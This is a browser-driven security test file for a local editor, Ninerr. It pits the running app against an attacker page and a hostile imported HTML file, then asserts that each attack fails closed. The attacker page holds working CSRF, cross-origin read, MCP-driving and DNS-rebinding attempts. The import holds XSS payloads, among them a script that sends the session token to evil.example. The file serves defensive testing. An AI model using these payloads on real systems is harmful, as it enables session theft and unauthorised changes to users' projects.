import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, readdirSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { createServer, request as httpRequest } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { browserTestOptions } from "./support/browser.mjs";
import { waitRevision } from "./support/editor.mjs";
import { attemptsIn, browse, openTab, startNinerr } from "./support/ninerr-process.mjs";

// P08-G9 (#230, founder section P08.9): the security primitives re-tested together, against
// Ninerr running as a person runs it (scripts/ninerr.mjs, under the no-network trap) with
// its editor open in a real browser. Two hostile neighbours:
// - a web page from another origin, open in the same browser, that tries to read or change
//   projects, drive the MCP endpoint, follow the editor's live changes, replay a used launch
//   link, or reach Ninerr under another host name (DNS rebinding);
// - an HTML file the person imports, written to run script, leak data and reach the network.
// Each attack must fail closed, and nothing may change or leave the computer.

/** The attacker's page: every attack it can make from a browser, results kept in `window.results`. */
const attackPage = (ninerr, usedLink) => `<!doctype html><html><head><title>Totally normal page</title></head><body>
<iframe name="sink" id="sink"></iframe>
<form id="form" method="post" action="${ninerr}/api/projects/create" target="sink" enctype="text/plain"><input name='{"name":"formpwned","x":"' value='"}'></form>
<script>
const ninerr = ${JSON.stringify(ninerr)};
const results = {};
window.results = results;
const settle = (name, promise) => promise.then((value) => { results[name] = value; }, (error) => { results[name] = "refused: " + (error && error.name); });
const attacks = [
  // Reading: the browser blocks a cross-origin read unless Ninerr allowed it.
  settle("read session", fetch(ninerr + "/api/session").then((response) => response.text())),
  settle("read projects", fetch(ninerr + "/api/projects").then((response) => response.text())),
  // Writing blind: "simple" requests a browser sends without asking first.
  settle("create project", fetch(ninerr + "/api/projects/create", { method: "POST", mode: "no-cors", headers: { "content-type": "text/plain" }, body: JSON.stringify({ name: "pwned" }) }).then(() => "sent")),
  settle("edit", fetch(ninerr + "/api/edit", { method: "POST", mode: "no-cors", headers: { "content-type": "text/plain" }, body: JSON.stringify({ baseRevision: 0, intent: "pwn", operations: [] }) }).then(() => "sent")),
  settle("mcp initialize", fetch(ninerr + "/mcp", { method: "POST", mode: "no-cors", headers: { "content-type": "text/plain" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "evil", version: "1" } } }) }).then(() => "sent")),
  settle("mcp tool", fetch(ninerr + "/mcp", { method: "POST", mode: "no-cors", headers: { "content-type": "text/plain" }, body: JSON.stringify({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "create_frame", arguments: { name: "pwned", width: 10, height: 10 } } }) }).then(() => "sent")),
  // Following the editor's live changes.
  settle("events", new Promise((resolve) => {
    const source = new EventSource(ninerr + "/api/events");
    source.onmessage = () => { source.close(); resolve("received an event"); };
    source.onerror = () => { source.close(); resolve("refused"); };
  })),
  // The same host under its other name, as a rebinding page would reach it.
  settle("read via localhost", fetch(ninerr.replace("127.0.0.1", "localhost") + "/api/session").then((response) => response.text())),
];
// A form posts across origins without asking, too.
document.getElementById("form").submit();
Promise.all(attacks).then(() => { results.done = true; });
</script></body></html>`;

/** The page the person imports: script, handlers, forms, frames, redirects and remote loads. */
const HOSTILE_IMPORT = `<!doctype html><html><head><title>Quarterly report</title>
<meta http-equiv="refresh" content="0; url=http://evil.example/refresh">
<link rel="stylesheet" href="http://evil.example/style.css">
<link rel="prefetch" href="http://evil.example/prefetch">
<script>window.top.pwnedByScript = true; fetch("http://evil.example/script?" + sessionStorage.getItem("ninerr.token"));</script>
<style>body { background: url("http://evil.example/css-background"); } @import url("http://evil.example/import.css");</style>
</head><body>
<h1 onclick="window.top.pwnedByClick = true">Quarterly report</h1>
<img src="x" onerror="window.top.pwnedByOnerror = true; fetch('http://evil.example/onerror')">
<img src="http://evil.example/pixel.png" alt="pixel">
<svg onload="window.top.pwnedBySvg = true"><a href="javascript:window.top.pwnedByHref = true"><text>link</text></a></svg>
<iframe src="http://evil.example/frame"></iframe>
<object data="http://evil.example/object"></object>
<embed src="http://evil.example/embed">
<form action="http://evil.example/form" method="post"><input name="q" value="1"><button>Send</button></form>
<a href="javascript:window.top.pwnedByLink = true">Click me</a>
<div style="background-image: url(http://evil.example/inline-style)">Revenue grew.</div>
<base href="http://evil.example/">
</body></html>`;

/** A raw request to Ninerr with chosen headers, as a rebinding or foreign page would send it. */
function raw(origin, path, headers, method = "GET") {
  const { hostname, port } = new URL(origin);
  return new Promise((resolve, reject) => {
    const req = httpRequest({ hostname, port, path, method, headers }, (response) => {
      response.resume();
      response.on("end", () => resolve(response.statusCode));
    });
    req.on("error", reject);
    req.end(method === "POST" ? "{}" : undefined);
  });
}

test("hostile neighbours get nothing from a running Ninerr: a foreign page, a rebinding host name, a used link, a hostile import (P08-G9)", { ...browserTestOptions(), timeout: 240_000 }, async () => {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "ninerr-security-")));
  const projects = join(root, "projects");
  const files = join(root, "files");
  const browser = await browse();
  const attacker = createServer();
  let ninerr = null;
  try {
    ninerr = await startNinerr(projects);
    const editor = await openTab(browser, ninerr.origin, ninerr.first);
    const { page } = editor;
    await page.locator("#new-project-name").fill("work");
    await page.keyboard.press("Enter");
    await waitRevision(page, 0);
    await page.locator("#action-insert-box").click();
    await waitRevision(page, 1);

    // 1. A page from another origin, in the same browser, while the editor is open.
    attacker.on("request", (request, response) => {
      response.writeHead(200, { "content-type": "text/html" }).end(attackPage(ninerr.origin, ninerr.first));
    });
    await new Promise((resolve) => attacker.listen(0, "127.0.0.1", resolve));
    const attackerOrigin = `http://127.0.0.1:${attacker.address().port}`;
    const context = await browser.newContext({ serviceWorkers: "block" });
    const reachedOutside = [];
    await context.route("**/*", (route) => {
      const url = route.request().url();
      if (url.startsWith(`${attackerOrigin}/`) || url.startsWith(`${ninerr.origin}/`) || url.startsWith(ninerr.origin.replace("127.0.0.1", "localhost"))) return route.continue();
      reachedOutside.push(url);
      return route.abort();
    });
    const evil = await context.newPage();
    await evil.goto(`${attackerOrigin}/`);
    await evil.waitForFunction(() => window.results?.done === true, null, { timeout: 30_000 });
    const results = await evil.evaluate(() => window.results);
    for (const name of ["read session", "read projects", "read via localhost"]) assert.match(String(results[name]), /^refused/u, `${name}: ${results[name]}`);
    assert.equal(results.events, "refused", "the live change stream refuses a page without the token");
    // Blind writes were sent; what counts is that none did anything (below).
    await new Promise((resolve) => setTimeout(resolve, 500));

    // 2. A used launch link, from shell history say, opens nothing.
    const replay = await context.newPage();
    await replay.goto(ninerr.first);
    await replay.waitForFunction(() => document.getElementById("dialog-title")?.textContent === "Open Ninerr from its launcher", null, { timeout: 30_000 });
    assert.equal(await replay.evaluate(() => document.documentElement.dataset.ready ?? null), null, "a used link does not open the editor");
    await context.close();

    // 3. Ninerr under a host name it is not (DNS rebinding), and foreign or missing origins.
    const port = new URL(ninerr.origin).port;
    assert.equal(await raw(ninerr.origin, "/api/session", { host: `evil.example:${port}` }), 421, "a rebound host name is refused");
    assert.equal(await raw(ninerr.origin, "/api/session", { host: `127.0.0.1:${Number(port) + 1}` }), 421, "another port's name is refused");
    assert.equal(await raw(ninerr.origin, "/api/session", { host: `127.0.0.1:${port}`, origin: attackerOrigin }), 403, "a foreign origin is refused");
    assert.equal(await raw(ninerr.origin, "/api/session", { host: `127.0.0.1:${port}` }), 401, "no token, no session");
    assert.equal(await raw(ninerr.origin, "/mcp", { host: `127.0.0.1:${port}`, "content-type": "application/json" }, "POST"), 401, "no agent credential, no MCP");

    // Nothing the attacker sent changed anything: the one project, still at revision 1.
    assert.deepEqual(readdirSync(projects).filter((entry) => !entry.startsWith(".")), ["work"], "no project was created");
    await page.reload();
    await page.waitForFunction(() => document.documentElement.dataset.ready === "true");
    await waitRevision(page, 1);

    // 4. A hostile HTML file, imported by the person.
    writeFileSync(join(root, "report.html"), HOSTILE_IMPORT);
    await page.locator("#action-import").click();
    await page.locator("#import-file").setInputFiles(join(root, "report.html"));
    await page.locator("#dialog[open] button.primary", { hasText: "Review import" }).click();
    await page.locator("#import-review").waitFor();
    await page.locator("#dialog[open] button.primary", { hasText: "Import" }).click();
    await waitRevision(page, 2);
    // Its content is on the canvas, with nothing that runs or loads.
    const frame = await page.evaluate(() => {
      const doc = document.querySelector("iframe").contentDocument;
      return {
        heading: doc.querySelector("h1")?.textContent ?? null,
        active: doc.querySelectorAll("[data-ninerr-root] :is(script, iframe, object, embed, form, meta, link, base, style)").length,
        handlers: [...doc.querySelectorAll("[data-ninerr-root] *")].flatMap((element) => [...element.attributes].map((attribute) => attribute.name)).filter((name) => name.startsWith("on")),
        scriptLinks: [...doc.querySelectorAll("[data-ninerr-root] :is([href], [src], [data])")].map((element) => element.getAttribute("href") ?? element.getAttribute("src") ?? element.getAttribute("data")).filter((value) => /^\s*javascript:|evil\.example/iu.test(value ?? "")),
      };
    });
    assert.equal(frame.heading, "Quarterly report", "the content itself was imported");
    // The second layer, under the import's and the renderer's allowlists: a frame that runs no
    // script and loads nothing, whatever reached it.
    const layers = await page.evaluate(() => {
      const element = document.querySelector("iframe");
      return {
        sandbox: (element.getAttribute("sandbox") ?? "").split(/\s+/u).filter(Boolean).sort(),
        policy: element.contentDocument.querySelector("head meta[http-equiv='Content-Security-Policy']")?.getAttribute("content") ?? null,
      };
    });
    assert.deepEqual(layers.sandbox, ["allow-same-origin"], "the canvas frame is sandboxed without scripts");
    assert.match(layers.policy ?? "", /^default-src 'none';/u, "and its policy loads nothing by default");
    assert.deepEqual({ active: frame.active, handlers: frame.handlers, scriptLinks: frame.scriptLinks }, { active: 0, handlers: [], scriptLinks: [] });
    // Clicking what the page meant to be clicked runs nothing either.
    await page.evaluate(() => {
      const doc = document.querySelector("iframe").contentDocument;
      for (const element of doc.querySelectorAll("h1, a, img, svg")) element.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    const pwned = await page.evaluate(() => Object.keys(window).filter((key) => key.startsWith("pwned")));
    assert.deepEqual(pwned, [], "no script from the import ran");
    assert.equal(await page.title(), "work — Ninerr", "the editor's page was not changed");

    // 5. Through all of it, nothing left the computer: not from the editor, not from Ninerr.
    assert.deepEqual(editor.foreign, [], "the editor's page requested nothing outside Ninerr");
    assert.deepEqual(reachedOutside, [], "the attacker's page reached nothing outside the two origins");
    assert.deepEqual(attemptsIn(ninerr.output.stderr), [], "Ninerr's own code connected to nothing off this computer");
    assert.equal(await ninerr.stop(), 0);
    ninerr = null;
    await editor.page.context().close();
  } finally {
    if (ninerr !== null) await ninerr.kill();
    await browser.close();
    await new Promise((resolve) => attacker.close(resolve));
    rmSync(root, { recursive: true, force: true });
  }
});
